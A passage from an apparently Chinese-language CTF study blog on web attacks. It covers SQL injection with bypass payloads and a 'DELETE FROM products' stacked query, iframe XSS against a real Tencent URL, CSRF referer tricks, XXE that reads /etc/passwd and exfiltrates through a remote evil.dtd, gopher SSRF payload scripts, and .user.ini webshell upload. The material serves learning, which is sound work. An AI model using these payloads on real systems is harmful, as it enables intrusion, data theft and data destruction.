60个字符】\n或者用substr(xxx,begin,length)，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示\n（4）联合查询注入可以使用union的情况下的注入。\n（5）堆查询注入（堆叠注入）可以同时执行多条语句的执行时的注入。\n（6）宽字节注入宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围），示例如下图：\n\nMYSQL默认字符集是GBK等宽字节字符集。如上图所示%df’被PHP转义，单引号被加上反斜杠\\，变成了%d’，其中\\的十六进制是%5C，那么现在%d’&#x3D;%d%5C%27,如果程序的默认字符集是GBK等宽字节字符集，MYSQL用GBK编码时，会认为%df%5C是一个宽字符，也就是縗，也就是说：%df\\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就可以注入了\n用来绕过addslashes\n③按照注入点类型来分类：  （1）数字型注入点：许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id&#x3D;1 and 1&#x3D;1\n  （2）字符型注入点：网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name&#x3D;‘admin’ and 1&#x3D;1 ’\n  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword&#x3D;关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’&#x3D;’%1%’\n④基于程度和顺序的注入(哪里发生了影响)★一阶注射 \n★二阶注射 \n\n\n\n\n\n\n\n\n\n一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；\n二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. \n1.堆叠注入1.堆叠注入定义\n\n\n\n\n\n\n\n\n   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。\n2.堆叠注入原理   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：  Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n3.堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。\n下面我以一道题为例解析堆叠注入，该题来自于 buuctf的[强网杯 2019]随便注 \n2.无列名注入上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧\n*3.联合注入联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据\n举个例子：最初users表中只有一行数据，\n\n我们通过union select查询就可以构造一行虚拟的数据，\n\n这样，我们在users表中利用联合查询创建了一行虚拟的数据。\n\n1.几个常用函数\n\n\n\n\n\n\n\n\n1.version()——MySQL 版本 \n2.user()——数据库用户名 \n3.database()——数据库名 \n4.@@datadir——数据库路径 \n5.@@version_compile_os——操作系统版本\n2.一般用于尝试的闭合语句Ps:&#96;&#96;–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–和#为注释符，把后面语句注释掉，使其无法执行&#96;\n\n\n\n\n\n\n\n\n\n有时用–+，而不用#的原因是，http无法解释#，所以用–+来代替，–+中起到注释作用其实是–，但是如果单纯的–会和后面的内容连上从而导致sql语句出错，所以有了+会解释为空格，从而避免报错故–%20   &lt;&#x3D;&#x3D;&gt;   –+\n\n\n\n\n\n\n\n\n\nor 1&#x3D;1–+\n‘or 1&#x3D;1–+\n“or 1&#x3D;1–+\n)or 1&#x3D;1–+\n‘)or 1&#x3D;1–+\n“) or 1&#x3D;1–+\n“))or 1&#x3D;1–+\n3.sql中逻辑运算【万能密码的原理】提出一个问题 Select * from users where id=1 and 1=1;这条语句为什么能够选择出 id&#x3D;1 的内容，and 1&#x3D;1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。\nSelect * from admin where username=&#x27;admin&#x27; and password=&#x27;admin&#x27;\n\n我们可以用 ’or 1=1# 作为密码输入。原因是为什么？ \n这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： \nSelect * from admin where username=&#x27;admin&#x27; and password=&#x27;&#x27;or 1=1#&#x27;\n\nExplain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 username=&#39;admin&#39; and password=&#39;&#39;or 1=1。三个条件用 and 和 or 进行连接。在 sql 中，我们 and 的运算优先级大于 or 的元算优先级。因此可以看到 第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b &#x3D; false,第一个条件和第二个条件执行 and 后是假，再与第三 个条件 or 运算，因为第三个条件 1&#x3D;1 是恒成立的，所以结果自然就为真了。因此上述的语 句就是恒真了\nps.逻辑语句的区别\n\n\n\n\n\n\n\n\n\n1.and:两个或多个条件同时满足，才为真（显示一条数据）\n2.or:两个或多个条件满足其中一个即为真（显示一条数据）\n\n使用and语句注意select * from test where a = 1 and a = 2这样操作肯定不行，后面的一个值会把前面的值给覆盖掉，最后执行的是select * from test where a = 2\n而用or语句的话select * from test where a = 1 or a = 2,执行select * from test where a = 1,若a=1为假，则执行select * from test where a = 2\n\n\n\n\n\n\n\n\n\n\n3.union:联合查询，将多个查询结果合并（如果有一个结果为空，不影响其他结果合并）起来时，系统会自动去掉重复元组\nselect * from news where id= -1 union select 2,3--+\n\n\n\n\n\n\n\n\n\n\n这里注意，如果id&#x3D;1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来\n请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 \n4.注入的一般流程【按顺序查询注入】ps.关键记忆和使用\n\n\n\n\n\n\n\n\nschema_name 数据库名\ninformation_schema.schemata 全部数据库\ntable_name 表名\ninformation_schema.tables 全部表\ntable_schema=’xxxxx’ ‘xxxx’为目标表所在的数据库名\ncolumn_name 列名\ninformation_schema.columns 全部列名\ntable_name=’xxxxx’ ‘xxxx’想要查询数据所在的表名\n[1] 注入语句\n\n\n\n\n\n\n\n\n1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】\nselect schema_name from information_schema.schemata \n2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】\nselect table_name from information_schema.tables where table_schema=’xxxxx’ \n3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】\nselect column_name from information_schema.columns where table_name=’xxxxx’ \n4）获取某列的内容 【以下语句功能，显示该列】\nselect column_name  from  table_name\n[2] 注入流程图\n5.mysql错误分析解决1）子查询结果多于一行Subquery returns more than 1 row\n以select * from table1 where table1.colums=(select columns from table2)这个sql语句为例\n\n\n\n\n\n\n\n\n\n1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）\n2.在子查询条件语句加limit 1,找到一个符合条件的就可以了select * from table1 where table1.colums in (select columns from table2 limit 1) \n如果需要继续向后查询，可以用limit 0,1   limit 1,1   limit 2,1   …..  limit n,1\n3.在子查询前加any关键字&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)\nps. 子查询语句子查询是指在一个select语句中嵌套另一个slecet语句。\nany、in、some、all分别是子查询关键词之一。\nany可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。\nall可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。\n他们进行子查询的语法如下：\n\n\n\n\n\n\n\n\n\noperand comparison_operator any(subquery);operand in (subquery);operand coparison_operator some(subquery);operand coparison_operator all (subquery);\nany,all关键词必须与一个比较操作符一起使用\nany关键词可以理解为对于子查询返回的列中的任意数值，如果比较结果为ture，则返回true例如：\nselect s1 from t1 where s1 > any (select s1 from t2)\n\n假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。\nall关键词对于子查询返回的列中的所有值，如果比较结果为true，则返回true例如：\nselect s1 from t1 where s1> all (select s1 from s2)\n\n假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。\nnot in 是 “&lt;&gt;all”的别名，用法相同。语句in 与“&#x3D;any”是相同的。例如：\nselect s1 from t1 where s1 = any (select s1 from t2)select s1 from t1 where s1 in (select s1 from t2)\n语句some是any的别名，用法相同。例如：\nselect s1 from t1 where s1 &lt;&gt; any (select s1 from t2)select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)\n6.mysql 连接函数， 分组连接函数\n\n\n\n\n\n\n\n\n1.concat()concat(str1,str2,…)\n若有一个参数为NULL，返回NULL\n2.concat_ws()concat_ws(‘间隔符号’,str1,str2,…)\n间隔符号可以是空格，不能不写，否则返回为空\n显示为str1间隔符号str2间隔符号str3…\n3.group_concatgroup_concat([distinct] 字段名 [ order by 排序字段 asc&#x2F;desc ] [separator “分隔符”])\n多行数据在一行显示函数\n根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔\nps. 组合使用如果是多字段组合 显示在一行的eg：\ngroup_concat(concat_ws(‘,’,concat(str1，str2) ) )；\n一个字段的话eg：\ngroup_concat(concat_ws(‘,’,str1，str2) )； \n*7.过滤替换1）双写绕过\n\n\n\n\n\n\n\n\n(用于把黑名单的字符替换成空)：seselectlect,ununionion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）\nps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如order,information.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成oorrder,infoorrmation.schema_schemata等等\n2）大小写混合\n\n\n\n\n\n\n\n\n(用于黑名单中只有小写或大写，并没有对大小写进行区分)\n如sEleCt,unIoN等等\n*3）替换\n\n\n\n\n\n\n\n\nselect：\nunion：\n空格：%0a（分隔符）,%a0，%09(tab), /**/, () 【如select(table_name)from(xxx)】，&lt; &gt;， %20(space),  IFS$9（$IFS是Unix系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）\n&#x3D;：like\nand：&amp;&amp;\nor：||\n#,– : ;%00\n，：用join来代替逗号\n8. 注释符\n\n\n\n\n\n\n\n\n#、 –+、 –%20、 %23\n二、xss把xss-labs做一下就差不多了，后面进阶内容按是需要学习吧\nDom Xss进阶 [善变iframe]\n\n\n\n\n\n\n\n\n作者：心伤的瘦子\n来自：PKAV技术宅社区\n网址：http://www.pkav.net\n转载于：https://blog.csdn.net/weixin_39934520/article/details/106151313\n简要描述：\n\n\n\n\n\n\n\n\n\n有时候，输出还会出现在 \n  \n\niframe 的 src属性本来应该是一个网址，\n但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。\n这一类问题，我将其归为[路径可控]问题。当然上面说到的是普通的反射型XSS。\n有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src&#x3D;”[可控的url]”; 同样会导致XSS问题，来看看本例吧\n详细说明：\n\n\n\n\n\n\n\n\n\n1.先来说说iframe的变化。\n1.1 最好懂的，onload执行js\n\n\n1.2 src 执行javascript代码\n\n\n1.3 IE下vbscript执行代码\n\n\n1.4 Chrome下data协议执行代码\nalert(1)\">\n\n1.5 上面的变体\nalert(1)\">\n\n1.6 Chrome下srcdoc属性\nalert(1)\">\n\n有兴趣的，可以一个一个的去测试上面的效果，注意浏览器的特异性哦。\n\n接着我们来看看具体的例子。\n\n\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&gid=yl&cid=68&from=\n\n\n我们先开调试工具，看看有没有可见的输出。\n\n\n可以看到，我们参数的aaaaaa被带入到了。\n这样一来，就满足了我们的使用条件。\n我们试试\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&gid=yl&cid=68&from=\n\n。。竟然没反应。我们来看看刚才的那个地方。\n\n可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。恩，看来就是这段代码导致的。\n\n一起看看这段代码。\nfunction OpenFrame(function OpenFrame(url) &#123;\n\tif (url.toLowerCase().indexOf(&#x27;http://&#x27;) != &#x27;-1&#x27; || url.toLowerCase().indexOf(&#x27;https://&#x27;) != &#x27;-1&#x27; || url.toLowerCase().indexOf(&#x27;javascript:&#x27;) != &#x27;-1&#x27;) return false;\n\tdocument.getElementById(\"toolframe\").src = url;\n&#125;\n\n不难看出，腾讯对 javascript:做出了判断。\ndocument.getElementById(\"toolframe\").src = url;\n\n这句是导致XSS的一句代码。而openFrame的url参数则来自于(无关代码省略)：\n...\nvar tool_url = getQueryStringValue(\"turl\");\n...\nopenFrame(tool_url);\n...\n\n\n根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。\n\n在IE下，我们可以使用vbscript来执行代码。 vbscript里 ‘ 单引号表示注释，类似JS里的&#x2F;&#x2F;\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(1)&#x27;&gid=yl&cid=68&from=\n\n\n在chrome下，我们可以用data协议来执行JS。\nhttp://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,alert(1)&#x27;&gid=yl&cid=68&from=\n\n\n漏洞证明：见详细说明\n修复方案：\n\n\n\n\n\n\n\n\n危险的不光是javascript:，\nvbscript:, data: 等同样需要过滤。\n三、csrf1）绕过token有的时候其实网站根本不验证token，但是在其他方面上它仍然在工作，所以为了绕过它可以考虑抓包删去token，从而正常访问\n2）绕过referer1.referer条件为空条件时\n\n\n\n\n\n\n\n\n解决方案:\n利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，\n如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。\n例:1.利用data:协议\n\n\n\n\n\n\nbase64编码 解码即可看到代码\n2.利用https协议https向http跳转的时候Referer为空拿一个https的webshell\n\n\nattack.php写上CSRF攻击代码\n2.判断Referer是某域情况下绕过\n\n\n\n\n\n\n\n\n比如你找的csrf是http://xxx.com \n验证的referer是验证的*.http://xx.com \n可以找个二级域名 之后&lt;img “csrf地址”&gt; 之后在把文章地址发出去 就可以伪造。\n3.判断referer是否存在某关键字\n\n\n\n\n\n\n\n\nreferer判断存在不存在http://google.com这个关键词\n在网站新建一个http://google.com目录 把CSRF存放在http://google.com目录,即可绕过\n4.判断Referer是否含有某域名\n\n\n\n\n\n\n\n\n判断了Referer开头是否以http://126.com以及126子域名 不验证根域名为http://126.com 那么我这里可以构造子域名http://x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。\n3）不同浏览器的区别 在满足上述前后端条件后，浏览器在完成预检请求后会自动携带上Cookie字段，但是由于浏览器的内核特性不同，此时又出现了不同的情况\n\n\n\n\n\n\n\n\n\n  Firefox携带网站A的Cookie值发起POST请求  Edge没有携带网站A的Cookie值发起POST请求  Chrome没有携带网站A的Cookie值发起POST请求\n四、xxe\n\n\n\n\n\n\n\n\n推荐学习文章\n必须在文档类型定义 (DTD) 中创建实体\n正如您所看到的，一旦 XML 文档被解析器处理，它将js用定义的常量“Jo Smith”替换定义的实体。如您所见，这有很多优点，因为您可以js在一个地方更改为例如“John Smith”。\n在 Java 应用程序中，XML 可用于从客户端获取数据到服务器，我们都熟悉 JSON api，我们也可以使用 xml 来获取信息。大多数情况下，框架会根据 xml 结构自动填充 Java 对象，例如：\n\n\n\n\n\n\n\n\n\n\nPCDATA:它是XML解析器解析的文本数据使用的一个术语。XML 文档中的文本通常解析为字符数据，或者（按照文档类型定义术语）称为 PCDATA。\nXML 的特殊字符（&amp;、&lt; 和 &gt;）在 PCDATA 中可以识别，并用于解析元素名称和实体。PCDATA（字符数据）区域被解析器视为数据块，从而允许您在数据流中包含任意字符。\n如果 XML 解析器配置为允许外部 DTD 或实体，我们可以使用以下内容更改以下 XML 片段：\n&lt;?xml version=&quot;1.0&quot; encoding=&lt;?xml version=&quot;1.0&quot; encoding=\"utf-8\"?>\nauthor [\n  js SYSTEM \"file:///etc/passwd\">\n]>\nauthor>&js;author>\n\n现在会发生什么？我们从本地文件系统中定义了一个包含，XML 解析器将加载该文件，并将在引用实体的任何位置添加内容。假设 XML 消息返回给用户，消息将是：\n\n\nXXE DOS攻击同XXE攻击我们可以执行一个DOS服务攻击对服务器。 一个例子的攻击是： \n\n\n \n \n \n \n \n \n \n \n \n \n]>\n&lol9;\n\n当XML  parser载这个文件，它认为，它包括一个根本的元素，”lolz“，包含的文本”&amp;lol9;”.  然而，”&amp;lol9;”是一个已定义的实体，扩展为一个包含十个”&lol8;”串。  每个”&amp;lol8;”串是一个已定义的实体，扩展到十”&amp;lol7;”串，等等。  \n在所有的实体扩张，已经进行处理，这一小型(&lt;1KB)的框XML实际上会采取了几乎3千兆字节的存储器。 \n盲注XXE在许多情况下，攻击者可以将 XXE payload发送到 Web 应用程序，但永远不会返回响应，这被称为带外漏洞（Out-of-band）\n利用此类漏洞的过程需要利用参数实体，使攻击者让 XML 解析器向攻击者\n控制的服务器发出额外的请求，以便读取文件的内容\n作为一个攻击者你有WebWolf在你的控制( 这可以是任何服务器你的控制之下. ), 例如，可以使用这个服务器平使用  http://127.0.0.1:9090/home\n我们如何使用这些终端检验我们是否可以执行XXE? \n我们可以再次使用WebWolf举办一个文件叫  attack.dtd 创建这一文件与以下内容： \n\nhttp://127.0.0.1:9090/landing&#x27;>\n\n现在提交形式的改变使用xml： \n\n\n%remote;\n]>\n\n  test&ping;\n\n\n现在WebWolf浏览’进入的请求，你会看到： \n&#123;\n  \"method\" : \"GET\",\n  \"path\" : \"/landing\",\n  \"headers\" : &#123;\n    \"request\" : &#123;\n      \"user-agent\" : \"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\",\n    &#125;,\n  &#125;,\n  \"parameters\" : &#123;\n    \"test\" : [ \"HelloWorld\" ],\n  &#125;,\n  \"timeTaken\" : \"1\"\n&#125;\n\n因此，通过XXE能够连接我们自己的服务器，这意味着XXE注入是可能的。 因此，通过XXE注入我们基本上能够达到，curl命令的相同的效果 \n引用远程服务器上的DTD另一种方式% 变量(有空格)，该方式只能在DTD中进行变量引用%变量，而不能在XML中引用。\n改为引用远程服务器上的DTD(evil.dtd)\n如果在响应包中无回显又想要读取敏感文件时，可以通过OOB带外注入的方法通过外带数据通道来提取数据，构造payload如下 ：\n&lt;?xml version=&lt;?xml version=\"1.0\"?>\nGVI [\nstart \"> \nbody SYSTEM \"file:///tmp/test.txt\" >\nend \"]]>\">\ndtd SYSTEM \"http://ip/evil.dtd\">\n%dtd;\n]>\n\n//攻击者远程部署evil.dtd\nwrite \"\">\n\nXXE 介绍与绕过一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。 \n在这种编码的帮助下，使用正则表达式可以很容易地绕过 WAF，因为在这种类型的 WAF 中，正则表达式通常仅配置为单字符集。 外来编码也可用于绕过成熟的 WAF，因为它们并不总是能够处理上面列出的所有编码。\n例如，libxml2 解析器只支持一种类型的 utf-32 - utf-32BE，特别是不支持 BOM。\n五、ssrf不当函数利用\n\n\n\n\n\n\n\n\nPHP中下面函数的使用不当会导致SSRF:&#96;&#96;file_get_contents() fsockopen() curl_exec()&#96;   \nfile_get_content\n\n\n\n\n\n\n\n\nfile_get_content()函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码\ncurl_exec\n\n\n\n\n\n\n\n\n通过curl_exec()函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成http://xxxx或者curl支持的其他协议等都会被curl执行（curl支持`telnet ftp ftps dict file ldap&#96;等）\ngopher协议总结\n\n\n\n\n\n\n\n\n原文\n另一篇推荐的文章\n\n\n\n\n\n\n\n\n\ngopher协议\n是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面\n1)利用：\n\n\n\n\n\n\n\n\n攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求\ngopher协议的格式：\n\n\n\n\n\n\n\n\n\ngopher://IP:port/_TCP/IP数据流  \n比如，\ngopher://127.0.0.1:80/_POST /flag.php HTTP/1.1\n\n\n\n\n\n\n\n\n\n有时候读取文件需要从网站本身的127.0.0.1发出请求\n可以利用file://伪协议用于读取本地文件\n比如?url=file:///var/www/html/flag.php\n2)GTE请求\n\n\n\n\n\n\n\n\n构造HTTP数据包\nURL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束\n发送gopher协议, 协议后的IP一定要接端口\n3)POST请求\n\n\n\n\n\n\n\n\nPOST与GET传参的区别：它有4个参数为必要参数\n需要传递Content-Type,Content-Length,host,post的参数\n比如：\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1:80\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\nkey=51457bb0a50c1eb2c92dcc3ec3c2cc13        //post参数\n\n\n\n\n\n\n\n\n\n\nHost、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致\npython脚本生成payload（POST和GTE请求都适用）\nimport urllib.parse\n\npayload = \"\"\"\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=a68a3b03e80ce7fef96007dfa01dc077\n\"\"\"\ntmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码\nnew = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;) #CRLFL漏洞\nresult = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new\nresult = urllib.parse.quote(result)# 对新增的部分继续编码\nprint(result)\n\n构造一个提交文件的POST请求首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式\nimport urllib.parse\n\npayload = \\\n\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 293\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundaryz0BDuCoolR1Vg7or\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\nContent-Type: text/plain\n\nhello world!\n------WebKitFormBoundaryz0BDuCoolR1Vg7or\nContent-Disposition: form-data; name=\"submit\"\n\nsubmit\n------WebKitFormBoundaryz0BDuCoolR1Vg7or--\n\"\"\"\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)\nresult = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new\nresult = urllib.parse.quote(result)\nprint(result)\n\n\ngopher打FastCGI\n\n\n\n\n\n\n\n\n看我这一篇\ngopher打redis\n\n\n\n\n\n\n\n\n看我这一篇\ngopher打mysqlgopher打mysql，就是利用gopher协议传shell到mysql中。\n首先Mysql存在三种连接方式\n\n\n\n\n\n\n\n\n\nUnix套接字；内存共享&#x2F;命名管道；TCP&#x2F;IP套接字；\nMySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。\n\n\n\n\n\n\n\n\n\n当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证当无需密码认证时直接发送TCP&#x2F;IP数据包即可\n这儿对localhost和127.0.0.1做一个区别\n\n\n\n\n\n\n\n\n\nlocalhost也叫local ，正确的解释是：本地服务器。127.0.0.1的正确解释是：本机地址（本机服务器），它的解析通过本机的host文件，windows自动将localhost解析为127.0.0.1。\nlocalhost（local）是不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制。\n127.0.0.1是通过网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制\n简单说当我们通过mysql -hlocalhost -uname去连接的时候，**没有经过网卡**，使用的是unix套接字连接，这种时候我们tcpdump是抓不到包的当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。mysql -h 127.0.0.1 -uname\n我们平常打mysql最常用的就是打无密码的mysql\n但是我们在用gopher还是需要用dict协议去得到mysql的端口(默认是**3306**)\n直接使用的gopherus工具,直接快速生成payload\n\n六、文件上传1.多重过滤绕过下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式\n这里需要绕过的点如下\n\n\n\n\n\n\n\n\n\n\n检查文件内容是否有php字符串\n检查后缀中是否有htaccess或php\n检查文件头部信息\n文件MIME类型\n\n短标签对于第一点可以利用短标签绕过，例如 &lt;?=phpinfo();?&gt;\n\n\n\n\n\n\n\n\n\n把short_open_tag字段改为On，就可以实现短标签功能\n短标签：1.能正常解析类似于这样形式的php文件： phpinfo() ?&gt;  \n2.使用&lt;?=$a?&gt;的形式输出，在短标签看来，&lt;?=$a?&gt;\n3.&lt;?=(表达式)?&gt;就相当于\n\n\n\n\n\n\n\n\n\n\n\n正确：\n&#x27;)\n?>\n\n报错：\n&#x27;)\n?>\n\n从这个对比试验我们可以看出：在短标签模式下，我们执行php语句php函数，都用类似于这样形式的php文件：\nphpinfo();?>\n\n但是我们要输出一个flag，或者变量时，使用&lt;?=$a?&gt;的形式输出\n.user.ini对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章\n\n\n\n\n\n\n\n\n\n文章\n在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。\n 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。\n 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。\n.user.ini内容\n\nauto_prepend_file=5.jpg\n\n这样.user.ini当前目录下的文件会自动包含图片🐎，从而让我们成功拿到shell\n\n第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a\nJPG ：FF D8 FF E0 00 10 4A 46 49 46\n\nGIF(相当于文本的GIF89a)：47 49 46 38 39 61\n\nPNG： 89 50 4E 47\n\n第四点绕过方法即修改上传时的Content-Type\n因此最终的payload为： 上传.user.ini，内容为\nGIF89a                  \nauto_prepend_file=a.jpg\n\nauto_append_file、auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 \n\n使用方法很简单，直接写在.user.ini中：\n\n上传a.jpg，内容为\nGIF89a\n\n\n2.文件类型\n3.其他绕过1）::$DATA绕过\n\n\n\n\n\n\n\n\n● 绕过⽅法：\n○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。\n绕过原理：\n● 与上⾯题相⽐呢这个道题去掉了：$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符\n串::$DATA 这⾏代码。\n● ::$DATA 是什么意思呢？必须是windows, 必须是php, 必须是那个源⽂件，php在window的时候如\n果⽂件名+”::$DATA”会把::$DATA之后的数据当成⽂件流处理,不会检测后缀名.且持”::$DATA”之前\n的⽂件名\n● 他的⽬的就是不检查后缀名\n2）点+空格+点绕过\n\n\n\n\n\n\n\n\n例如，只允许上传.jpg|.png|.gif后缀的⽂件！\n● 绕过⽅法：\n○ 